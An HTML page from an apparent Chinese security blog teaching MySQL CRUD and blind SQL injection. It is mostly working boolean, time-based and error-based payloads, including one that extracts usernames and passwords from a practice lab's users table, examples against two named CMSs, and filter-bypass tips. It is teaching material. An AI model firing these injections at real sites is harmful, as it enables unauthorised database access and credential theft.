@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <link rel="stylesheet" href="/css/custom.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MySQL：增删改查与盲注技巧</title>
+    <meta charset="utf-8">
+    <meta name="description" content="Ladder@MySQL：增删改查与盲注技巧 - Hzhsrc home">
+    <meta name="author" content="hzhsec">
+    <link rel="canonical" href="http://118.178.86.67/list/base_bug/sql%E6%B3%A8%E5%85%A5/sql3/">
+
+    <link rel="alternate" type="application/rss+xml" href="http://118.178.86.67//index.xml" title="Hzhsrc home">
+
+    
+
+
+    <meta property="og:title" content="MySQL：增删改查与盲注技巧" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://118.178.86.67/list/base_bug/sql%E6%B3%A8%E5%85%A5/sql3/" /><meta property="article:section" content="list" />
+<meta property="article:published_time" content="2024-04-22T15:40:00+08:00" />
+<meta property="article:modified_time" content="2024-04-22T15:40:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="MySQL：增删改查与盲注技巧"/>
+<meta name="twitter:description" content=""/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "目录",
+      "item": "http://118.178.86.67/list/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "基础漏洞",
+      "item": "http://118.178.86.67/list/base_bug/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  4 ,
+      "name": "MySQL：增删改查与盲注技巧",
+      "item": "http://118.178.86.67/list/base_bug/sql%E6%B3%A8%E5%85%A5/sql3/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "MySQL：增删改查与盲注技巧",
+  "name": "MySQL：增删改查与盲注技巧",
+  "description": "",
+  "keywords": [
+    "PHP", "SQL注入", "MySQL", "渗透测试"
+  ],
+  "articleBody": "一、增删改查（CRUD）基础示例 下面示例展示常见的 SQL 操作（以 news 表为例），理解这些语句有助于构造注入 payload：\n查询（Read） SELECT * FROM news WHERE id = $id; 新增（Create） INSERT INTO news (title, content) VALUES ('标题', '内容'); 删除（Delete） DELETE FROM news WHERE id = $id; 修改（Update） UPDATE news SET title = '新标题' WHERE id = $id; 注：理解后端如何拼接这些语句（是否带引号、是否使用预处理、是否对输入做类型转换）是判断注入可行性的关键。\n二、盲注概念与分类 盲注：当注入无法直接回显数据到页面时，利用页面差异（布尔/时间/报错）逐位或逐条获取信息的技术。常见三类：\n布尔盲注（Boolean-based）\n通过构造条件使页面表现为真或假，从而推断目标信息。 常用函数：regexp, like, ascii, left, ord, mid, substr。 延时盲注（Time-based）\n根据 SQL 执行时间判断条件是否成立（SLEEP()、IF()）。 适用于完全无回显且无法触发错误的情况。 报错盲注（Error-based）\n利用数据库函数触发可回显的错误信息（updatexml()、extractvalue() 等）。 需目标环境输出原始错误信息才能有效。 三、布尔盲注常用技巧与示例 判断数据库名长度： AND LENGTH(DATABASE()) = 7 判断数据库名第 1 个字符： AND LEFT(DATABASE(),1) = 'p' -- 或 AND ORD(LEFT(DATABASE(),1)) = 112 逐字符提取（从第 n 位取 1 个字符）： AND SUBSTR(DATABASE(), n, 1) = 'x' ORD()/ASCII() 常用于绕过单引号或字符串过滤，用数值比较代替字符串比较。\n四、延时盲注示例 基础延时： AND SLEEP(1) 条件触发延时： AND IF(1=1, SLEEP(5), 0) -- 或 AND IF(ORD(LEFT(DATABASE(),1)) = 107, SLEEP(2), 0) 当请求延迟明显增加时，说明条件成立。\n五、报错盲注示例 通过 updatexml() 触发错误并在错误中拼接输出： AND UPDATEXML(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e), 1) 通过 extractvalue()： AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1))) 在某些 CMS 中可以通过插入/更新导致报错并借报错回显敏感信息： 'hzk' OR UPDATEXML(1, CONCAT(0x7e, (SELECT CONCAT_WS('-', username, password) FROM pikachu.users LIMIT 0,1)), 1) OR ' 六、注入条件判断与测试示例 在检测不同类型注入点时，常见判断语句：\n布尔型检测（页面只有成功/失败两种输出） AND LENGTH(DATABASE()) = 6 延时型检测（通过时间判断） AND IF(1=1, SLEEP(5), 0) 报错型检测（依赖报错输出） AND UPDATEXML(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e), 1) 示例比较（删除接口测试）：\n删除（延时）： 1 AND IF(1=1, SLEEP(5), 0) 删除（布尔）： 3 AND LENGTH(DATABASE()) = 6 -- 若无回显无法判定 删除（报错）： 4 AND UPDATEXML(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e), 1) 七、CMS 案例（实战示例） xhcms 插入报错： ' AND UPDATEXML(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e), 1) AND ' kkcms 删除延时： AND IF(1=1, SLEEP(5), 0) OR IF(1=1, SLEEP(5), 0) OR IF(ORD(LEFT(DATABASE(),1)) = 107, SLEEP(2), 0) 这些 payload 在不同 CMS 和不同字段类型上可能需要调整引号、注释符号和编码。\n八、小结与检测建议 先判断能否回显（若能，优先用 error-based 或 union-based）； 无回显优先考虑布尔盲注与延时盲注； 使用 ORD()/ASCII()、十六进制编码、PREPARE/EXECUTE 等绕过常见过滤； 在真实渗透中遵循法律与授权范围，避免造成破坏性操作（如任意删除/写入）。 参考资料 OWASP SQL Injection Cheat Sheet 各类 CMS 漏洞实战记录 ",
+  "wordCount" : "253",
+  "inLanguage": "en",
+  "datePublished": "2024-04-22T15:40:00+08:00",
+  "dateModified": "2024-04-22T15:40:00+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "hzhsec"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://118.178.86.67/list/base_bug/sql%E6%B3%A8%E5%85%A5/sql3/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Hzhsrc home",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://118.178.86.67/favicon.ico"
+    }
+  }
+}
+</script>
+    <link rel="icon" href="/images/hzhsec.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/hzhsec.png">
+
+<link rel="manifest" href="/images/hzhsec.png">
+    
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.7.0/style.css" />
+
+    
+    
+    <link rel="stylesheet" href="/css/main.min.ec28f09e946fc0df77c187fcd0d0ebde58fca6de8efb8e1620f3d45c32d4da88.css" integrity="sha256-7CjwnpRvwN93wYf80NDr3lj8pt6O&#43;44WIPPUXDLU2og=" crossorigin="anonymous" media="screen" />
+
+    
+    <link rel="stylesheet" href="/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css" />
+
+    
+    <script src="/js/highlight.min.min.c098d85b5396dec4707ea2cead1445b4dc2ff0fc56b8dbbd9049d0d1c50ad237.js"></script>
+    <script>hljs.highlightAll();</script>
+
+    <script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script>
+    </head>
+<body>
+      <main class="wrapper"><nav class="navigation">
+    <section class="container">
+        <a class="navigation-brand" href="/">
+            主页
+        </a>
+        <input type="checkbox" id="menu-toggle" />
+        <label class="menu-button float-right" for="menu-toggle">
+            <span></span><span></span><span></span>
+        </label>
+        
+        <ul class="navigation-list" id="navigation-list">
+            
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/list/">目录</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/archives/">归档</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/message/">关于</a>
+            </li>
+            
+            <li class="navigation-item navigation-menu">
+                <a class="navigation-link" href="/categories/">分类</a>
+            </li>
+            
+            
+
+            <li class="navigation-item menu-separator">
+                <span>|</span>
+            </li>
+
+            
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="https://github.com/hzhsec">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github">
+      <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+    </svg>
+    </a>
+            </li>
+            
+            <li class="navigation-item navigation-social">
+                <a class="navigation-link" href="/message/">    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+         stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-mail">
+      <path d="M4 4h16v16H4z"></path><polyline points="4,4 12,12 20,4"></polyline>
+    </svg>
+    </a>
+            </li>
+            
+            
+
+            <li class="navigation-item navigation-dark">
+                <button id="mode" type="button" aria-label="toggle user light or dark theme">
+                    <span class="toggle-dark">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon">
+                            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                        </svg>
+                    </span>
+                    <span class="toggle-light">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun">
+                            <circle cx="12" cy="12" r="5"></circle>
+                            <line x1="12" y1="1" x2="12" y2="3"></line>
+                            <line x1="12" y1="21" x2="12" y2="23"></line>
+                            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                            <line x1="1" y1="12" x2="3" y2="12"></line>
+                            <line x1="21" y1="12" x2="23" y2="12"></line>
+                            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                        </svg>
+                    </span>
+                </button>
+            </li>
+            
+        </ul>
+        
+    </section>
+</nav>
+
+<div id="content">
+<article class="blog-single">
+  <header class="blog-title">
+    <h1>MySQL：增删改查与盲注技巧</h1>
+  </header>
+
+  <p>
+  <small>
+    April 22, 2024&nbsp;· 253 words&nbsp;· 2 min</small>
+
+  
+<p>
+
+  <div class="blog-toc">
+    <nav id="TableOfContents"></nav>
+  </div>
+
+  <section class="blog-content"><h1 id="一增删改查crud基础示例">一、增删改查（CRUD）基础示例</h1>
+<p>下面示例展示常见的 SQL 操作（以 <code>news</code> 表为例），理解这些语句有助于构造注入 payload：</p>
+<ul>
+<li><strong>查询（Read）</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> news <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>id;
+</span></span></code></pre></div><ul>
+<li><strong>新增（Create）</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> news (title, content) <span style="color:#66d9ef">VALUES</span> (<span style="color:#e6db74">&#39;标题&#39;</span>, <span style="color:#e6db74">&#39;内容&#39;</span>);
+</span></span></code></pre></div><ul>
+<li><strong>删除（Delete）</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">DELETE</span> <span style="color:#66d9ef">FROM</span> news <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>id;
+</span></span></code></pre></div><ul>
+<li><strong>修改（Update）</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">UPDATE</span> news <span style="color:#66d9ef">SET</span> title <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;新标题&#39;</span> <span style="color:#66d9ef">WHERE</span> id <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>id;
+</span></span></code></pre></div><blockquote>
+<p>注：理解后端如何拼接这些语句（是否带引号、是否使用预处理、是否对输入做类型转换）是判断注入可行性的关键。</p>
+</blockquote>
+<hr>
+<h1 id="二盲注概念与分类">二、盲注概念与分类</h1>
+<p><strong>盲注</strong>：当注入无法直接回显数据到页面时，利用页面差异（布尔/时间/报错）逐位或逐条获取信息的技术。常见三类：</p>
+<ol>
+<li>
+<p><strong>布尔盲注（Boolean-based）</strong></p>
+<ul>
+<li>通过构造条件使页面表现为真或假，从而推断目标信息。</li>
+<li>常用函数：<code>regexp</code>, <code>like</code>, <code>ascii</code>, <code>left</code>, <code>ord</code>, <code>mid</code>, <code>substr</code>。</li>
+</ul>
+</li>
+<li>
+<p><strong>延时盲注（Time-based）</strong></p>
+<ul>
+<li>根据 SQL 执行时间判断条件是否成立（<code>SLEEP()</code>、<code>IF()</code>）。</li>
+<li>适用于完全无回显且无法触发错误的情况。</li>
+</ul>
+</li>
+<li>
+<p><strong>报错盲注（Error-based）</strong></p>
+<ul>
+<li>利用数据库函数触发可回显的错误信息（<code>updatexml()</code>、<code>extractvalue()</code> 等）。</li>
+<li>需目标环境输出原始错误信息才能有效。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h1 id="三布尔盲注常用技巧与示例">三、布尔盲注常用技巧与示例</h1>
+<ul>
+<li>判断数据库名长度：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">AND</span> <span style="color:#66d9ef">LENGTH</span>(<span style="color:#66d9ef">DATABASE</span>()) <span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span>
+</span></span></code></pre></div><ul>
+<li>判断数据库名第 1 个字符：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">AND</span> <span style="color:#66d9ef">LEFT</span>(<span style="color:#66d9ef">DATABASE</span>(),<span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;p&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- 或
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">AND</span> ORD(<span style="color:#66d9ef">LEFT</span>(<span style="color:#66d9ef">DATABASE</span>(),<span style="color:#ae81ff">1</span>)) <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span>
+</span></span></code></pre></div><ul>
+<li>逐字符提取（从第 n 位取 1 个字符）：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">AND</span> SUBSTR(<span style="color:#66d9ef">DATABASE</span>(), n, <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;x&#39;</span>
+</span></span></code></pre></div><blockquote>
+<p><code>ORD()</code>/<code>ASCII()</code> 常用于绕过单引号或字符串过滤，用数值比较代替字符串比较。</p>
+</blockquote>
+<hr>
+<h1 id="四延时盲注示例">四、延时盲注示例</h1>
+<ul>
+<li>基础延时：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">AND</span> SLEEP(<span style="color:#ae81ff">1</span>)
+</span></span></code></pre></div><ul>
+<li>条件触发延时：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">AND</span> <span style="color:#66d9ef">IF</span>(<span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>, SLEEP(<span style="color:#ae81ff">5</span>), <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">-- 或
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">AND</span> <span style="color:#66d9ef">IF</span>(ORD(<span style="color:#66d9ef">LEFT</span>(<span style="color:#66d9ef">DATABASE</span>(),<span style="color:#ae81ff">1</span>)) <span style="color:#f92672">=</span> <span style="color:#ae81ff">107</span>, SLEEP(<span style="color:#ae81ff">2</span>), <span style="color:#ae81ff">0</span>)
+</span></span></code></pre></div><p>当请求延迟明显增加时，说明条件成立。</p>
+<hr>
+<h1 id="五报错盲注示例">五、报错盲注示例</h1>
+<ul>
+<li>通过 <code>updatexml()</code> 触发错误并在错误中拼接输出：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">AND</span> UPDATEXML(<span style="color:#ae81ff">1</span>, CONCAT(<span style="color:#ae81ff">0</span>x7e, (<span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">VERSION</span>()), <span style="color:#ae81ff">0</span>x7e), <span style="color:#ae81ff">1</span>)
+</span></span></code></pre></div><ul>
+<li>通过 <code>extractvalue()</code>：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">AND</span> EXTRACTVALUE(<span style="color:#ae81ff">1</span>, CONCAT(<span style="color:#ae81ff">0</span>x5c, (<span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">table_name</span> <span style="color:#66d9ef">FROM</span> information_schema.tables <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">1</span>)))
+</span></span></code></pre></div><ul>
+<li>在某些 CMS 中可以通过插入/更新导致报错并借报错回显敏感信息：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39;hzk&#39;</span> <span style="color:#66d9ef">OR</span> UPDATEXML(<span style="color:#ae81ff">1</span>, CONCAT(<span style="color:#ae81ff">0</span>x7e, (<span style="color:#66d9ef">SELECT</span> CONCAT_WS(<span style="color:#e6db74">&#39;-&#39;</span>, username, password) <span style="color:#66d9ef">FROM</span> pikachu.users <span style="color:#66d9ef">LIMIT</span> <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>)), <span style="color:#ae81ff">1</span>) <span style="color:#66d9ef">OR</span> <span style="color:#e6db74">&#39;
+</span></span></span></code></pre></div><hr>
+<h1 id="六注入条件判断与测试示例">六、注入条件判断与测试示例</h1>
+<p>在检测不同类型注入点时，常见判断语句：</p>
+<ul>
+<li><strong>布尔型检测</strong>（页面只有成功/失败两种输出）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">AND</span> <span style="color:#66d9ef">LENGTH</span>(<span style="color:#66d9ef">DATABASE</span>()) <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>
+</span></span></code></pre></div><ul>
+<li><strong>延时型检测</strong>（通过时间判断）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">AND</span> <span style="color:#66d9ef">IF</span>(<span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>, SLEEP(<span style="color:#ae81ff">5</span>), <span style="color:#ae81ff">0</span>)
+</span></span></code></pre></div><ul>
+<li><strong>报错型检测</strong>（依赖报错输出）</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">AND</span> UPDATEXML(<span style="color:#ae81ff">1</span>, CONCAT(<span style="color:#ae81ff">0</span>x7e, (<span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">VERSION</span>()), <span style="color:#ae81ff">0</span>x7e), <span style="color:#ae81ff">1</span>)
+</span></span></code></pre></div><p><strong>示例比较（删除接口测试）</strong>：</p>
+<ul>
+<li>删除（延时）：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">AND</span> <span style="color:#66d9ef">IF</span>(<span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>, SLEEP(<span style="color:#ae81ff">5</span>), <span style="color:#ae81ff">0</span>)
+</span></span></code></pre></div><ul>
+<li>删除（布尔）：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">3</span> <span style="color:#66d9ef">AND</span> <span style="color:#66d9ef">LENGTH</span>(<span style="color:#66d9ef">DATABASE</span>()) <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>  <span style="color:#75715e">-- 若无回显无法判定
+</span></span></span></code></pre></div><ul>
+<li>删除（报错）：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ae81ff">4</span> <span style="color:#66d9ef">AND</span> UPDATEXML(<span style="color:#ae81ff">1</span>, CONCAT(<span style="color:#ae81ff">0</span>x7e, (<span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">VERSION</span>()), <span style="color:#ae81ff">0</span>x7e), <span style="color:#ae81ff">1</span>)
+</span></span></code></pre></div><hr>
+<h1 id="七cms-案例实战示例">七、CMS 案例（实战示例）</h1>
+<ul>
+<li><strong>xhcms 插入报错</strong>：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&#39; AND UPDATEXML(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e), 1) AND &#39;
+</span></span></code></pre></div><ul>
+<li><strong>kkcms 删除延时</strong>：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">AND</span> <span style="color:#66d9ef">IF</span>(<span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>, SLEEP(<span style="color:#ae81ff">5</span>), <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">OR</span> <span style="color:#66d9ef">IF</span>(<span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>, SLEEP(<span style="color:#ae81ff">5</span>), <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">OR</span> <span style="color:#66d9ef">IF</span>(ORD(<span style="color:#66d9ef">LEFT</span>(<span style="color:#66d9ef">DATABASE</span>(),<span style="color:#ae81ff">1</span>)) <span style="color:#f92672">=</span> <span style="color:#ae81ff">107</span>, SLEEP(<span style="color:#ae81ff">2</span>), <span style="color:#ae81ff">0</span>)
+</span></span></code></pre></div><p>这些 payload 在不同 CMS 和不同字段类型上可能需要调整引号、注释符号和编码。</p>
+<hr>
+<h1 id="八小结与检测建议">八、小结与检测建议</h1>
+<ul>
+<li>先判断能否回显（若能，优先用 error-based 或 union-based）；</li>
+<li>无回显优先考虑布尔盲注与延时盲注；</li>
+<li>使用 <code>ORD()</code>/<code>ASCII()</code>、十六进制编码、<code>PREPARE/EXECUTE</code> 等绕过常见过滤；</li>
+<li>在真实渗透中遵循法律与授权范围，避免造成破坏性操作（如任意删除/写入）。</li>
+</ul>
+<hr>
+<h1 id="参考资料">参考资料</h1>
+<ul>
+<li>OWASP SQL Injection Cheat Sheet</li>
+<li>各类 CMS 漏洞实战记录</li>
+</ul></section>
+
+  
+  
+  <div class="paginator">
+    
+    <a class="prev" href="http://118.178.86.67/list/base_bug/%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/up3/">
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966C5.98257 11.8297 5.98456 11.9753 6.05061 12.0063C7.05496 12.4779 8.92941 13.9264 9.94496 15M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+      <span>文件包含原理、分类、利用与修复</span></a>
+    
+    
+    <a class="next" href="http://118.178.86.67/list/base_bug/%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/up4/"><span>文件安全：下载与删除、目录安全：遍历与穿越</span>
+      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966C16.0174 11.8297 16.0154 11.9753 15.9494 12.0063C14.945 12.4779 13.0706 13.9264 12.055 15M15.5556 11.9667C13.1345 12.0608 8 12 6 11" stroke="currentColor" stroke-linecap="round"/>
+      </svg>
+    </a>
+    
+  </div>
+  
+
+  
+
+
+</article>
+
+        </div><footer class="footer">
+  <p>&copy; 2025 <a href="http://118.178.86.67/">Hzhsrc home</a>
+    Powered by
